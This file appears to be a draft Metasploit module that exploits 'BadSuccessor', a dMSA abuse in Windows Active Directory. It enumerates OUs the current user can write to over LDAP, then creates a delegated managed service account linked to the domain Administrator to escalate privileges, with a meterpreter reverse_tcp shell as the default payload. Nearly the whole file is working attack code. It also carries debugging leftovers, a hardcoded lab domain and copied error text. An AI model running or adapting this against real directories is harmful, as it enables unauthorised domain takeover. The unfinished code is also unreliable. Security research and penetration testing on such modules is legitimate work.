##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'pry-byebug'

class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::LDAP
  include Rex::Proto::LDAP
  include Msf::OptionalSession::LDAP
  #include Msf::Exploit::Remote::CheckModule

  # LDAP_SERVER_SD_FLAGS constant definition, taken from https://ldapwiki.com/wiki/LDAP_SERVER_SD_FLAGS_OID
  LDAP_SERVER_SD_FLAGS_OID = '1.2.840.113556.1.4.801'.freeze
  OWNER_SECURITY_INFORMATION = 0x1
  GROUP_SECURITY_INFORMATION = 0x2
  DACL_SECURITY_INFORMATION = 0x4
  SACL_SECURITY_INFORMATION = 0x8

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BadSuccessor: dMSA abuse to Escalate Privileges in Windows Active Directory',
        'Description' => %q{
          BadSuccessor is a local privilege escalation vulnerability that allows an attacker to abuse the dMSA
          (Managed Service Account) feature in Active Directory.

          Warning: this is #bad
        },
        'Author' => [
          'AngelBoy', # discovery
          'Spencer McIntyre',   # Help with the Kerberos Bits
          'jheysel-r7'  # module
        ],
        'References' => [
          [ 'URL', 'https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory?&vid=badsuccessor-demo-video'],
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Privileged' => true,
        'Arch' => [ ARCH_X64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [
          ['Windows x64', { 'Arch' => ARCH_X64 }]
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
        },
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-06-11',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, ],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )
  end

  #TODO looks like the check method will be in a separate module - maybe? could be?


  # This will return a list of SIDs that can edit the template from which the ACL is derived.
  # The method checks the CreateChild, GenericAll, WriteDacl and WriteOwner bits of the access_mask to see if the user
  # or group has write permissions over the OU
  def get_sids_for_write(dacl)
    allowed_sids = []

    dacl[:aces].each do |ace|
      access_mask = ace[:body][:access_mask]

      # CreateChild comes from protocol field
      mask = access_mask[:protocol]
      has_create_child = (mask & 0x1) != 0

      # Other rights come from explicit bits
      has_generic_all = access_mask[:ga] == 1
      has_write_dacl  = access_mask[:wd] == 1
      has_write_owner = access_mask[:wo] == 1

      if has_create_child || has_generic_all || has_write_dacl || has_write_owner
        allowed_sids << ace[:body][:sid]
      end
    end

    allowed_sids
  end

  def get_ous_we_can_write_to(user_sid)
    required_rights = %w[CreateChild GenericAll WriteDacl WriteOwner]
    organizational_units = []

    filter = '(objectClass=organizationalUnit)'
    attributes = ['distinguishedName', 'name', 'objectClass', 'nTSecurityDescriptor']
    entries = query_ldap_server(filter, attributes)
    entries.each do |entry|

      security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.read(entry['nTSecurityDescriptor']&.first)
      next unless security_descriptor

      if security_descriptor.dacl
        write_sids = get_sids_for_write(security_descriptor.dacl)
      end

      next if write_sids.nil? || write_sids.empty?

      # If the user SID is not in the list of SIDs with write permissions, skip this OU
      if write_sids.include?(user_sid)
        print_status("Found OU with write permissions for user SID #{user_sid}: #{entry.dn}")
        organizational_units << entry.dn
      else
        print_status("Skipping OU #{entry.dn} as it does not have write permissions for user SID #{user_sid}")
        next
      end

    end

    organizational_units
  end

  def query_ldap_server(raw_filter, attributes, base_prefix: nil)
    if base_prefix.blank?
      full_base_dn = @base_dn.to_s
    else
      full_base_dn = "#{base_prefix},#{@base_dn}"
    end
    begin
      filter = Net::LDAP::Filter.construct(raw_filter)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Could not compile the filter! Error was #{e}")
    end

    # Set the value of LDAP_SERVER_SD_FLAGS_OID flag so everything but
    # the SACL flag is set, as we need administrative privileges to retrieve
    # the SACL from the ntSecurityDescriptor attribute on Windows AD LDAP servers.

    all_but_sacl_flag = OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION
    control_values = [all_but_sacl_flag].map(&:to_ber).to_ber_sequence.to_s.to_ber
    controls = []
    controls << [LDAP_SERVER_SD_FLAGS_OID.to_ber, true.to_ber, control_values].to_ber_sequence
    returned_entries = @ldap.search(base: full_base_dn, filter: filter, attributes: attributes, controls: controls)
    query_result_table = @ldap.get_operation_result.table
    validate_query_result!(query_result_table, filter)
    returned_entries
  end

  def create_dmsa(account_name, writeable_dn)
    dn  = "CN=#{account_name},#{writeable_dn}"
    print_status("Attempting to dmsa account cn: #{account_name}, dn: #{dn}")
    dmsa_attributes = {
      'objectclass' => ["top", "person", "organizationalPerson", "user", "computer", "msDS-DelegatedManagedServiceAccount"],
      'cn' => [account_name],
      'useraccountcontrol' => ["4096"],
      'samaccountname' => [account_name + '$'],
      'dnshostname' => ["dontcare.com"],
      'msds-supportedencryptiontypes' => ["28"],
      'msds-managedpasswordid' => ["\x01\x00\x00\x00KDSK\x02\x00\x00\x00k\x01\x00\x00\v\x00\x00\x00\a\x00\x00\x00\xC7\x14\x863y\xD1WQ\x8C\x9A4\xCC\xD6;\xF8x\x00\x00\x00\x00\x14\x00\x00\x00\x14\x00\x00\x00m\x00s\x00f\x00.\x00l\x00o\x00c\x00a\x00l\x00\x00\x00m\x00s\x00f\x00.\x00l\x00o\x00c\x00a\x00l\x00\x00\x00"],
      'msds-managedpasswordinterval' => ["30"],
      'msds-delegatedmsastate' => ["2"],
      'msds-managedaccountprecededbylink'=> ["CN=Administrator,CN=Users,DC=msf,DC=local"],
      'name' => [account_name]
    }

    unless @ldap.add(dn: dn, attributes: dmsa_attributes)

      res = @ldap.get_operation_result

      case res.code
      when Net::LDAP::ResultCodeInsufficientAccessRights
        print_error("Insufficient access to create dMSA seed")
      when Net::LDAP::ResultCodeEntryAlreadyExists
        print_error("Seed object #{account_name} already exists")
      when Net::LDAP::ResultCodeConstraintViolation
        print_error("Constraint violation: #{res.error_message}")
      else
        print_error("#{res.message}: #{res.error_message}")
      end

      return false
    end

    print_good("Created dmsa #{account_name}")
    true

  end

  def query_account(account_name)
    base_dn = 'OU=BadBois,DC=msf,DC=local'

    filter = Net::LDAP::Filter.eq("cn", account_name)
    entry = nil
    @ldap.search(base: base_dn, filter: filter) do |e|
      entry = e
    end

    if entry.nil?
      print_error("Original object not found")
      exit
    end

    attrs_to_copy = {}
    entry.each do |attr, values|

      next if %w[distinguishedname dn objectguid objectsid whencreated whenchanged samaccounttype instancetype iscriticalsystemobject objectcategory
             usnchanged usncreated name badpwdcount lastlogoff lastlogon localpolicyflags pwdlastset accountexpires
             dscorepropagationdata logoncount badpasswordtime countrycode codepage primarygroupid].include?(attr.to_s)

      attrs_to_copy[attr.to_s] = values.map(&:to_s)
    end

    attrs_to_copy.each do |key, value|
      if value.is_a?(Array)
        print_status("#{key} => [#{value.map { |v| v.inspect }.join(', ')}]")
      else
        print_status("#{key} => #{value.inspect}")
      end
    end

  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)
      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        unless (@base_dn = ldap.base_dn)
          fail_with(Failure::NotFound, "Couldn't discover base DN!")
        end
      end

      @ldap = ldap

      # Run LDAP whoami - get user SID / group info
      whoami_response = ''
      begin
        whoami_response = ldap.ldapwhoami
      rescue Net::LDAP::Error => e
        print_warning("The module failed to run the ldapwhoami command, ESC4 detection can't continue. Error was: #{e.class}: #{e.message}.")
        return
      end

      if whoami_response.empty?
        print_error("Unable to retrieve the username using ldapwhoami, ESC4 detection can't continue")
        return
      end


      sam_account_name = whoami_response.split('\\')[1]
      user_raw_filter = "(sAMAccountName=#{sam_account_name})"
      attributes = ['DN', 'objectSID', 'objectClass', 'primarygroupID']
      our_account = ldap.search(base: @base_dn, filter: user_raw_filter, attributes: attributes)&.first

      # Get vulnerable OUs
      ous = get_ous_we_can_write_to(Rex::Proto::MsDtyp::MsDtypSid.read(our_account[:objectsid].first).value)
      writeable_dn = ous.first

      fail_with(Failure::NoTarget, "There are no Organization Units we can write to, the exploit can not continue") if ous.empty?
      account_name =  Faker::Internet.username(separators: '')
      print_good("Found #{ous.length} OUs we can write to")
      create_dmsa(account_name, writeable_dn)
      query_account(account_name)
    end
  end
end